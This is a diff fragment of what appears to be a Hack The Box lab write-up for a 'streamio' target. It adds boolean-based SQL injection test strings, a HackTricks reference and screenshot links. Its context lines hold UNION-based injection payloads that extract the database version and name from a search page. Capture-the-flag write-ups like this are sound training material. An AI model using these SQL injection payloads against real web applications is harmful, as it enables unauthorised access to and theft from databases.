@@ -82,6 +82,16 @@ https://watch.streamio.htb/search.php
 
 
 ```
+https://book.hacktricks.xyz/pentesting-web/sql-injection
+1' and 1=1 --
+1' and 1=2 --
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/7418e160-7e1b-4fcb-a758-5d17f2bbac78)
+
+![image](https://github.com/regarmulia/HTB/assets/33616880/ab276d7c-1709-480d-aec3-98a35ba705cf)
+
+
+```
 10' union select 1,2,3,4,5,6 -- -
 10' union select 1,@@version,3,4,5,6 -- -
 10' union select 1,(select DB_NAME()),3,4,5,6 -- -
